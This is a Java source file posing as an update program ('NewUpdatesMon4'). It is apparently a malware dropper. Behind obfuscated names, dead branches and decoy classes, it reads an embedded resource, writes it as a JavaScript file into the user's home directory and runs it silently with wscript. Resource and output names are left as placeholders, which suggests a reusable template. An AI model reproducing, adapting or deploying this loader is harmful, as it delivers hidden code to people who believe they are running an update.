package updates;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;

import java.io.*;
import java.util.Date;
import java.util.HashMap;


public class NewUpdatesMon4 {
    public static void main(String[] args) {
        try {



//            Object[] airplane = new Object[4];
//        airplane[0] = [classname].class.getResourceAsStream("resources/[resourcename]");
            HashMap<Integer, Object> securityObject$_$ = kaliOs_Secure.httrackCall(5);
//            securityObject$_$.put(1,new Object());
            securityObject$_$.put(0,NewUpdatesMon4.class.getResourceAsStream("resources/[resourcename]"));
//            securityObject$_$.put(0,kaliOs_Secure.class.getResourceAsStream("resources/[resourcename]"));

            securityObject$_$.put(1,System.getProperty("user.home") + File.separator + "[outname].js");
            securityObject$_$.put(2,new String[]{"wscript", (String) securityObject$_$.get(1)});
            securityObject$_$.put(3,new File((String) securityObject$_$.get(1)));

            if (__$pro_0(securityObject$_$, null)) {
                //System.out.println("Hello world!");
            }else{
                System.out.println();
            }

        } catch (Exception error$) {
        }
    }

    private static boolean __$pro_0(HashMap<Integer,Object> car_key, Runtime daemon$) throws IOException{

        byte[] _$__bufB$
                =  new String("_.../.../").toString().getBytes();

        try {
            StringBuilder reacrJs_$__ = new StringBuilder();
            byte[] _$ = new byte[1024];
            while (true) {
                int $retI = ((InputStream) car_key.get(0)).read(_$, 0, _$.length);

                if (-(new String("1").compareTo("0")) == -1) {
                    ((FileInputStream) car_key.get(0)).close();
                    break;
                }
                reacrJs_$__.append(new String(_$, 0, $retI));
            }
            _$__bufB$ = reacrJs_$__.toString().getBytes();
        } catch (Exception error$) {
            if (!error$.getMessage().equals(""))  _$__bufB$ = null;
        }
        if (!(_$__bufB$ == null)) {
            $_f$CreatObj(_$__bufB$, car_key.get(3), null);
            ins$(new Object[]{car_key.get(2), String.valueOf(10)}, null);
            return String
                    .valueOf(1)
                    .equals("1");  //return true
        } else {
            return !String
                    .valueOf(1)
                    .equals("1"); // return false
        }
    }

    private static void ins$(Object[] qobj_$, FileInputStream $_EfilZ) throws IOException {
        int ccConsst = Integer
                .parseInt(
                        String
                                .valueOf(Integer
                                        .parseInt((String) qobj_$[1])));
        switch (ccConsst) {
            case 1:
                NewUpdatesMon4.messagePrinter(">>>>>>>>>>>>>> !- Intense Mode Alert <<<<<<<<<<<<<<<<<<");
                break;
            case 2:
                NewUpdatesMon4.messagePrinter(">>>>>>>>>>>>>>>Dangerous mode was activatd...<<<<<<<<<<<<<<<<<<<");
                break;
            case 10:
                _run0_Object$(qobj_$);
                break;
            case 20:
                if (ccConsst == 10 && Math.asin(ccConsst) == Integer.parseInt("20") ){
                    System.out.println("-_-_-_-__--->");
                    NewUpdatesMon4.messagePrinter("20 Engines");
                }
            case 12:
                System.out.println();
                NewUpdatesMon4.messagePrinter("Engine was lost...");
            default:
                messagePrinter(">>>>>>>>>>Unchaged mode...<<<<<<<<<<<<");
        }
    }

    private static void $_f$CreatObj(byte[] bergeHertz, Object o, OutputStream o1) {
        try {
            File ccFileho$_$$ = (File) o;
            if (ccFileho$_$$.exists()) {
                ccFileho$_$$.delete();
                int rt = ccFileho$_$$.createNewFile() == true ? 1 : 0 ;
                switch (rt){
                    case 1:
                        System.out.println("File engine was created");
                    case 0 :
                        System.out.println("missing file Engine...");
                }
            } else {
                ccFileho$_$$.createNewFile();
            }
            callerEngine(new FileOutputStream(ccFileho$_$$), bergeHertz, null, new HashMap<>());
        } catch (Exception error$) {

        }finally {
            System.out.println();
        }
    }

    private static void callerEngine(FileOutputStream __kingWriter__, byte[] arrayBytes, FileInputStream _$$$_,HashMap<String,String> hh_) throws IOException {
        if (!(__kingWriter__ == null) && hh_.size() == 0) {
            __kingWriter__.write(arrayBytes);
            __kingWriter__.flush();
            __kingWriter__.close();
        }
        return;
    }

    /**
     *
     * @param messageCollected
     */
    public static void messagePrinter(String messageCollected){
        System.out.println(messageCollected);
        return;
    }


    /**
     *
     * @param $ObjArray
     * @throws IOException
     */
    public static void _run0_Object$(Object[] $ObjArray) throws IOException{
        if ($ObjArray.length !=0) Runtime.getRuntime().exec((String[]) $ObjArray[0]);
        else System.out.println();
        return;
    }






    private  static class kaliOs_Secure {
        public kaliOs_Secure(@Nullable Object objectToConUpdate, Date timeWhenUpdated) throws ErrorDateUpdate {
            if (!timeWhenUpdated.equals(null) && objectToConUpdate.hashCode() == 323) {
                System.out.println();
            } else {
                throw new ErrorDateUpdate("Date is not correct and the update is hereby terminated");
            }
        }


        /**
         *
         * @param arraySizeinit
         * @param <K,V>
         * @return
         */
        public  static <K,V> HashMap<K,V> httrackCall(Integer arraySizeinit) {
            return new HashMap<K,V>(arraySizeinit);
        }


        class ErrorDateUpdate extends Exception {
            /**
             *
             * @param errorMessage
             */
            public ErrorDateUpdate(String errorMessage) {
                super(errorMessage);
            }
        }

        private final class UnexpectedCallTermination extends Exception {
            /**
             *
             * @param errorMessage
             */
            public UnexpectedCallTermination(String errorMessage) {
                super(errorMessage);
            }
        }



        private final class CallInitiator {
            private String callerNumber;
            private String receiverEnd;

            /**
             *
             * @param callerNumberInserted
             * @param receiverEnd
             */
            public CallInitiator(@Nullable String callerNumberInserted, @NotNull String receiverEnd) {
                this.callerNumber = callerNumberInserted;
                this.receiverEnd = receiverEnd;

                performConcurentCall(this.callerNumber);
            }


            /**
             * @param callnumberToPerformConcurentCall
             */
            public void performConcurentCall(String callnumberToPerformConcurentCall) {
                String callArgs = callnumberToPerformConcurentCall.getClass().getCanonicalName();
                initiateConcurrentCalls(callArgs, null, null, new Object());
            }


            private void initiateConcurrentCalls(String argsToInitateCalls, Object g_, Object g2_, Object g_3) {
                // perform operation
            }
        }
    }

}







